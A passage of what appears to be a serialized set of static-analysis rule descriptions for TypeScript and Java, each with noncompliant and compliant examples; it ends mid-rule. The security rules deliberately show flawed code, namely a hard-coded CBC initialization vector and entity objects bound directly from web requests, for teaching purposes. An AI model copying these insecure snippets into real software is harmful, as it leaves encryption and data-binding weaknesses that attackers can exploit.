typescript:S4621‡

typescriptS4621KUnion and intersection types should not be defined with duplicated elements"CRITICAL*ts:„
<p>The TypeScript type system offers a basic support for composite types:</p>
<ul>
  <li> <em>Union Types</em> represent a value that can be one of the several types. They are constructed using a vertical bar (<code>|</code>) like
  the following <code>type NumberOrString = number | string</code>. </li>
  <li> <em>Intersection Types</em> combine multiple types into one, so that the object of such type will have all the members of all intersection type
  elements. They are constructed using an ampersand (<code>&amp;</code>) like the following <code>type SerializablePerson = Person &amp;
  Serializable</code>. Intersection Types are often used to represent mixins. </li>
</ul>
<p>Duplicating types when defining a union or interaction type makes the code less readable. Moreover duplicated types might be a simple mistake and
another type should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function padLeft(value: string, padding: string | number | string) { // Noncompliant; 'string' type is used twice in a union type declaration
  // ...
}

function extend(p : Person) : Person &amp; Person &amp; Loggable { // Noncompliant; 'Person' is used twice
 // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function padLeft(value: string, padding: string | number | boolean) {
  // ...
}

function extend(p : Person) : Person &amp; Loggable {
  // ...
}
</pre>Z
CODE_SMELL
ì
typescript:S1192˛

typescriptS1192(String literals should not be duplicated"CRITICAL*ts:§<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 10 characters are excluded as well as literals matching <code>/^\w*$/</code>.
String literals inside import/export statements and JSX attributes are also ignored. The same goes for statement-like string literals, e.g. <code>'use strict';</code>.</p>Z
CODE_SMELL
”
typescript:S3353æ

typescriptS3353,Unchanged variables should be marked "const""CRITICAL*ts:‡<p>Marking a variable that is unchanged after initialization <code>const</code> is an indication to future maintainers that "no this isn't updated,
and it's not supposed to be". <code>const</code> should be used in these situations in the interests of code clarity.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function seek(input) {
  let target = 32;  // Noncompliant
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}

function getUrl(query) { &nbsp;&nbsp;&nbsp;
  let&nbsp;url; // Noncompliant
  url = "http://example.com";
  return url;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function seek(input) {
  const target = 32;
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}

function getUrl(query) { &nbsp;
  const&nbsp;url = "http://example.com";
  return url;
}
</pre>Z
CODE_SMELL
ª
typescript:S4335¶

typescriptS4335QTypes without members, 'any' and 'never' should not be used in type intersections"CRITICAL*ts:™<p>An intersection type combines multiple types into one. This allows you to add together existing types to get a single type that has all the
features you need. However an intersection with a type without members doesn't change the resulting type. In the opposite the usage of
<code>any</code> or <code>never</code> as part of an intersection will always results in <code>any</code> or <code>never</code> respectively. This is
almost certainly an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(p: MyType &amp; null) { // Noncompliant
 // ...
}

function bar(p: MyType &amp; any) { // Noncompliant
 // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(p: MyType | null) {
 // ...
}
// or
function foo(p: MyType &amp; AnotherType) {
 // ...
}

function bar(p: any) {
 // ...
}
</pre>ZBUG
ù

typescript:S4619à


typescriptS4619!"in" should not be used on arrays"CRITICAL*ts:º	<p>The <code>in</code> operator used on an array is valid but the code will certainly not have the expected behavior. The <code>in</code> operator
deals with the indexes of the array, not with the values. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function func1() {
    let arr = ["a", "b", "c"];

    let expectedValue = "b";
    if (expectedValue in arr) { // Noncompliant, will be always false
        return expectedValue + " found in the array";
    } else {
        return expectedValue + " not found";
    }
}

function func2() {
    let arr = ["a", "b", "c"];

    let expectedValue = "1"; // index #1 is corresponding to the value "b"
    if (expectedValue in arr) { // Noncompliant, will be always true because the array is made of 3 elements and the #1 is always there whatever its value
        return expectedValue + " found in the array";
    } else {
        return expectedValue + " not found";
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function func() {
    let arr = ["a", "b", "c"];

    let expectedValue = "b";
    if (arr.includes(expectedValue)) {
        return expectedValue + " was found in the array";
    } else {
        return expectedValue + " not found";
    }
}
</pre>ZBUG
œ

typescript:S3854∫


typescriptS3854)"super()" should be invoked appropriately"CRITICAL*ts:Ê	<p>There are situations where <code>super()</code> must be invoked and situations where <code>super()</code> cannot be invoked.</p>
<p>The basic rule is: a constructor in a non-derived class cannot invoke <code>super()</code>; a constructor in a derived class must invoke
<code>super()</code>.</p>
<p>Furthermore:</p>
<p>- <code>super()</code> must be invoked before the <code>this</code> and <code>super</code> keywords can be used.</p>
<p>- <code>super()</code> must be invoked with the same number of arguments as the base class' constructor.</p>
<p>- <code>super()</code> can only be invoked in a constructor - not in any other method.</p>
<p>- <code>super()</code> cannot be invoked multiple times in the same constructor.</p>
<h3>Known Limitations</h3>
<ul>
  <li> False negatives: some issues are not raised if the base class is not defined in the same file as the current class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class Dog extends Animal {
  constructor(name) {
    super();
    this.name = name;
    super();         // Noncompliant
    super.doSomething();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Dog extends Animal {
  constructor(name) {
    super();
    this.name = name;
    super.doSomething();
  }
}
</pre>ZBUG
¢
typescript:S3972ç

typescriptS3972&Conditionals should start on new lines"CRITICAL*ts:µ<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as
maintainers fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>Z
CODE_SMELL
ê	
typescript:S3504˚

typescriptS35042Variables should be declared with "let" or "const""CRITICAL*ts:ó<p>ECMAScript 2015 introduced the <code>let</code> and <code>const</code> keywords for block-scope variable declaration. Using <code>const</code>
creates a read-only (constant) variable.</p>
<p>The distinction between the variable types created by <code>var</code> and by <code>let</code> is significant, and a switch to <code>let</code>
will help alleviate many of the variable scope issues which have caused confusion in the past. </p>
<p>Because these new keywords create more precise variable types, they are preferred in environments that support ECMAScript 2015. However, some
refactoring may be required by the switch from <code>var</code> to <code>let</code>, and you should be aware that they raise <code>SyntaxError</code>s
in pre-ECMAScript 2015 environments.</p>
<p>This rule raises an issue when <code>var</code> is used instead of <code>const</code> or <code>let</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var color = "blue";
var size = 4;
</pre>
<h2>Compliant Solution</h2>
<pre>
const color = "blue";
let size = 4;
</pre>Z
CODE_SMELL
‘

typescript:S4275ø


typescriptS42755Getters and setters should access the expected fields"CRITICAL*ts:ﬂ	<p>Getters and setters provide a way to enforce encapsulation by providing <code>public</code> methods that give controlled access to
<code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly create the needed getters
and setters, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private _x: number = 0;
  private y: number = 0;

  public get x() {  // Noncompliant: field 'x' is not used in the return value
    return this.y;
  }

  public setX(val: number) { // Noncompliant: field 'x' is not updated
    this.y = val;
  }

  public getY() { // Noncompliant: field 'y' is not used in the return value
    return this.x;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private _x: number = 0;
  private y: number = 0;

  public get x() {
    return this._x;
  }

  public setX(val: number) {
    this.x = val;
  }

  public getY() {
    return this.y;
  }
}
</pre>ZBUG
˙

java:S4524Î
javaS4524 "default" clauses should be last"CRITICAL*java:ù<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>Z
CODE_SMELL
ò

java:S2222â
javaS2222Locks should be released"CRITICAL*java: <p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>
<p>Failing to do so will expose the conditional locking logic to the method's callers and hence be deadlock-prone.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private Lock lock = new Lock();

  public void doSomething() {
    lock.lock(); // Noncompliant
    if (isInitialized()) {
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private Lock lock = new Lock();

  public void doSomething() {
    if (isInitialized()) {
      lock.lock();
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>ZBUG
—

java:S2235¬
javaS22351IllegalMonitorStateException should not be caught"CRITICAL*java:„<p>According to Oracle Javadoc:</p>
<blockquote>
  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting
  on an object's monitor without owning the specified monitor.</p>
</blockquote>
<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and
<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  ...
  try {
    ...
    anObject.notify();
    ...
  } catch(IllegalMonitorStateException e) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  ...
  synchronized(anObject) {
    ...
    anObject.notify();
    ...
  }
}
</pre>Z
CODE_SMELL
Á

java:S1143ÿ
javaS11434Jump statements should not occur in "finally" blocks"CRITICAL*java:˝<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any
unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and
<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");   // incorrect "OK" message is printed
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // this message is not shown
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
    return;      // Noncompliant - prevents the RuntimeException from being propagated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // "ERROR" is printed as expected
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/mIEbAQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>ZBUG
»

java:S3329π
javaS33296Cypher Block Chaining IV's should be random and unique"CRITICAL*java:“<p>In encryption, when Cipher Block Chaining (CBC) is used, the Initialization Vector (IV) must be random and unpredictable. Otherwise, the encrypted
value is vulnerable to crypto-analysis attacks such as the "Chosen-Plaintext Attack".</p>
<p>An IV value should be associated to one, and only one encryption cycle, because the IV's purpose is to ensure that the same plaintext encrypted
twice will yield two different ciphertexts.</p>
<p>To that end, IV's should be:</p>
<ul>
  <li> random </li>
  <li> unpredictable </li>
  <li> publishable (IVs are frequently published) </li>
  <li> authenticated, along with the ciphertext, with a Message Authentication Code (MAC) </li>
</ul>
<p>This rule raises an issue when the IV is:</p>
<ul>
  <li> hard-coded </li>
  <li> created using <code>java.util.Random</code> rather than <code>java.security.SecureRandom</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyCbcClass {

  public String applyCBC(String strKey, String plainText) {
    byte[] bytesIV = "7cVgr5cbdCZVw5WY".getBytes("UTF-8");

    /* KEY + IV setting */
    IvParameterSpec iv = new IvParameterSpec(bytesIV);
    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes("UTF-8"), "AES");

    /* Ciphering */
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);  // Noncompliant because IV hard coded and cannot vary with each ciphering round
    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes("UTF-8"));
    return DatatypeConverter.printBase64Binary(bytesIV) // IV is typically published
            + ";" + DatatypeConverter.printBase64Binary(encryptedBytes);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyCbcClass {

  SecureRandom random = new SecureRandom();

  public String applyCBC(String strKey, String plainText) {
    byte[] bytesIV = new byte[16];
    random.nextBytes(bytesIV);

    /* KEY + IV setting */
    IvParameterSpec iv = new IvParameterSpec(bytesIV);
    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes("UTF-8"), "AES");

    /* Ciphering */
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes("UTF-8"));
    return DatatypeConverter.printBase64Binary(bytesIV)
            + ";" + DatatypeConverter.printBase64Binary(encryptedBytes);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/330">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#STATIC_IV">STATIC_IV</a> </li>
</ul>ZVULNERABILITY
£

java:S2119î
javaS2119!"Random" objects should be reused"CRITICAL*java:Ã<p>Creating a new <code>Random</code> object each time a random value is needed is inefficient and may produce numbers which are not random depending
on the JDK. For better efficiency and randomness, create a single <code>Random</code>, then store, and reuse it.</p>
<p>The <code>Random()</code> constructor tries to set the seed with a distinct value every time. However there is no guarantee that the seed will be
random or even uniformly distributed. Some JDK will use the current time as seed, which makes the generated numbers not random at all.</p>
<p>This rule finds cases where a new <code>Random</code> is created each time a method is invoked and assigned to a local random variable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingCommon() {
  Random rand = new Random();  // Noncompliant; new instance created with each invocation
  int rValue = rand.nextInt();
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
private Random rand = SecureRandom.getInstanceStrong();  // SecureRandom is preferred to Random

public void doSomethingCommon() {
  int rValue = this.rand.nextInt();
  //...
</pre>
<h2>Exceptions</h2>
<p>A class which uses a <code>Random</code> in its constructor or in a static <code>main</code> function and nowhere else will be ignored by this
rule.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZBUG
£

java:S3776î
javaS37766Cognitive Complexity of methods should not be too high"CRITICAL*java:∞<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
◊

java:S1114»
javaS1114U"super.finalize()" should be called at the end of "Object.finalize()" implementations"CRITICAL*java:Ã<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>
<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also
dispose some system resources.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void finalize() {   // Noncompliant; no call to super.finalize();
  releaseSomeResources();
}

protected void finalize() {
  super.finalize();  // Noncompliant; this call should come last
  releaseSomeResources();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void finalize() {
  releaseSomeResources();
  super.finalize();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/568.html">MITRE, CWE-568</a> - finalize() Method Without super.finalize() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>ZBUG
à	

java:S1598˘
javaS15986Package declaration should match source file directory"CRITICAL*java:ï<p>By convention, a Java class' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java
file located at <code>"src/org/bar/Foo.java"</code> should have a package of <code>"org.bar"</code>. </p>
<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the "Foo.java" class part of the
"com.apple" package, which could degrade the maintainability of both the class and its application.</p>
<p>Similarly, source placed in a folder with dots in its name instead of having the equivalent folder structure will compile but cause problems at run
time. For instance, code with a package declaration of <code>org.foo.bar</code> that is placed in <code>org/foo.bar</code> will compile, but the
classloader will always search for the class into the folder based on package structure, and will consequently expect sources to be in
<code>org/foo/bar</code> folder. <code>foo.bar</code> is therefore not a proper folder name for sources.</p>Z
CODE_SMELL
˝

java:S1113Ó
javaS11134The Object.finalize() method should not be overriden"CRITICAL*java:å<p>The <code>Object.finalize()</code> method is called on an object by the garbage collector when it determines that there are no more references to
the object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be
few microseconds to few minutes later. So when system resources need to be disposed by an object, it's better to not rely on this asynchronous
mechanism to dispose them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  ...
  protected void finalize() {
    releaseSomeResources();    // Noncompliant
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>Z
CODE_SMELL
£

java:S2444î
javaS2444?Lazy initialization of "static" fields should be "synchronized""CRITICAL*java:ß<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of static fields could mean that a second thread has access to a
half-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initialization block
should be <code>synchronized</code>.</p>
<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>
<p>This rule raises an issue whenever a lazy static initialization is done on a class with at least one <code>synchronized</code> method, indicating
intended usage in multi-threaded applications.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private static Properties fPreferences = null;

private static Properties getPreferences() {
        if (fPreferences == null) {
            fPreferences = new Properties(); // Noncompliant
            fPreferences.put("loading", "true");
            fPreferences.put("filterstack", "true");
            readPreferences();
        }
        return fPreferences;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static Properties fPreferences = null;

private static synchronized Properties getPreferences() {
        if (fPreferences == null) {
            fPreferences = new Properties();
            fPreferences.put("loading", "true");
            fPreferences.put("filterstack", "true");
            readPreferences();
        }
        return fPreferences;
    }
}
</pre>Z
CODE_SMELL
–

java:S2208¡
javaS2208#Wildcard imports should not be used"CRITICAL*java:<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with
the same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.*; // Noncompliant
import java.util.*; // Noncompliant

private Date date; // Date class exists in java.sql and java.util. Which one is this?
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Date;
import java.util.List;
import java.util.ArrayList;

private Date date;
</pre>
<h2>Exceptions</h2>
<p>Static imports are ignored by this rule. E.G.</p>
<pre>
import static java.lang.Math.*;
</pre>Z
CODE_SMELL
π

java:S2447™
javaS24473Null should not be returned from a "Boolean" method"CRITICAL*java:…<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and
<code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers'
code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Boolean isUsable() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>Z
CODE_SMELL
¿

java:S3422±
javaS3422+Dependencies should not have "system" scope"CRITICAL*java:ﬂ<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact
in an environment that's not configured just like yours is, your code won't work. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;dependency&gt;
  &lt;groupId&gt;javax.sql&lt;/groupId&gt;
  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;
  &lt;version&gt;2.0&lt;/version&gt;
  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;
  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;
&lt;/dependency&gt;
</pre>ZBUG
¸


java:S4635Ì

javaS4635SString offset-based methods should be preferred for finding substrings from offsets"CRITICAL*java:Ï	<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.substring(beginIndex).indexOf(char1)</code>.
This works well, but it creates a new <code>String</code> for each call to the <code>substring</code> method. When this is done in a loop, a lot of
<code>Strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>
<p>To avoid performance problems, <code>String.substring(beginIndex)</code> should not be chained with the following methods:</p>
<ul>
  <li> <code>indexOf(int ch)</code> </li>
  <li> <code>indexOf(String str)</code> </li>
  <li> <code>lastIndexOf(int ch)</code> </li>
  <li> <code>lastIndexOf(String str)</code> </li>
  <li> <code>startsWith(String prefix)</code> </li>
</ul>
<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>
<p>Using these methods gives the same result while avoiding the creation of additional <code>String</code> instances.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by "substring"
</pre>
<h2>Compliant Solution</h2>
<pre>
str.indexOf(char1, beginIndex);
</pre>Z
CODE_SMELL
¿

java:S2696±
javaS26964Instance methods should not write to "static" fields"CRITICAL*java:œ<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple
class instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>
methods.</p>
<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  private static int count = 0;

  public void doSomething() {
    //...
    count++;  // Noncompliant
  }
}
</pre>Z
CODE_SMELL
ø


java:S2692∞

javaS26923"indexOf" checks should not be for positive numbers"CRITICAL*java:œ	<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the
first element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider
using the <code>contains</code> method instead.</p>
<p>This rule raises an issue when an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested against
<code>&gt;0</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; 0) {  // Noncompliant
  // ...
}
if (name.indexOf("ish") &gt; 0) { // Noncompliant
  // ...
}
if (name.indexOf("ae") &gt; 0) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; -1) {
  // ...
}
if (name.indexOf("ish") &gt;= 0) {
  // ...
}
if (name.contains("ae") {
  // ...
}
</pre>Z
CODE_SMELL
’


java:S3305∆

javaS3305CFactory method injection should be used in "@Configuration" classes"CRITICAL*java:’	<p>When <code>@Autowired</code> is used, dependencies need to be resolved when the class is instantiated, which may cause early initialization of
beans or lead the context to look in places it shouldn't to find the bean. To avoid this tricky issue and optimize the way the context loads,
dependencies should be requested as late as possible. That means using parameter injection instead of field injection for dependencies that are only
used in a single <code>@Bean</code> method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Configuration
public class ‚ÄãFooConfiguration {

  @Autowired private ‚ÄãDataSource dataSource‚ÄãÕæ  // Noncompliant

  @Bean
  public ‚ÄãMyService myService() {
    return new ‚ÄãMyService(this‚Äã.dataSource‚Äã)Õæ
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Configuration
public class ‚ÄãFooConfiguration {

 @Bean
  public ‚ÄãMyService myService(DataSource dataSource) {
    return new ‚ÄãMyService(dataSource)Õæ
  }
}
</pre>
<h2>Exceptions</h2>
<p>Fields used in methods that are called directly by other methods in the application (as opposed to being invoked automatically by the Spring
framework) are ignored by this rule so that direct callers don't have to provide the dependencies themselves.</p>Z
CODE_SMELL
´

java:S4684ú
javaS4684PPersistent entities should not be used as arguments of "@RequestMapping" methods"CRITICAL*java:õ<p>On one side, Spring MVC automatically bind request parameters to beans declared as arguments of methods annotated with
<code>@RequestMapping</code>. Because of this automatic binding feature, it's possible to feed some unexpected fields on the arguments of the
<code>@RequestMapping</code> annotated methods. </p>
<p>On the other end, persistent objects (<code>@Entity</code> or <code>@Document</code>) are linked to the underlying database and updated
automatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.</p>
<p>These two facts combined together can lead to malicious attack: if a persistent object is used as an argument of a method annotated with
<code>@RequestMapping</code>, it's possible from a specially crafted user input, to change the content of unexpected fields into the database.</p>
<p>For this reason, using <code>@Entity</code> or <code>@Document</code> objects as arguments of methods annotated with <code>@RequestMapping</code>
should be avoided.</p>
<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,
<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import javax.persistence.Entity;

@Entity
public class Wish {
  Long productId;
  Long quantity;
  Client client;
}

@Entity
public class Client {
  String clientId;
  String name;
  String password;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class WishListController {

  @PostMapping(path = "/saveForLater")
  public String saveForLater(Wish wish) {
    session.save(wish);
  }

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(Wish wish) {
    session.save(wish);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class WishDTO {
  Long productId;
  Long quantity;
  Long clientId;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class PurchaseOrderController {

  @PostMapping(path = "/saveForLater")
  public String saveForLater(WishDTO wish) {
    Wish persistentWish = new Wish();
    // do the mapping between "wish" and "persistentWish"
    [...]
    session.save(persistentWish);
  }

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(WishDTO wish) {
    Wish persistentWish = new Wish();
    // do the mapping between "wish" and "persistentWish"
    [...]
    session.save(persistentWish);
  }
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when the parameter is annotated with <code>@PathVariable</code> from Spring Framework, since the lookup will be done via id,
the object cannot be forged on client side.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/915.html">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined
  Object Attributes </li>
  <li> <a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf">Two Security Vulnerabilities in the Spring
  Framework‚Äôs MVC by Ryan Berg and Dinis Cruz</a> </li>
</ul>ZVULNERABILITY
é

java:S3355ˇ
javaS3355Defined filters should be used"CRITICAL*java:∞<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not
invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;filter&gt;
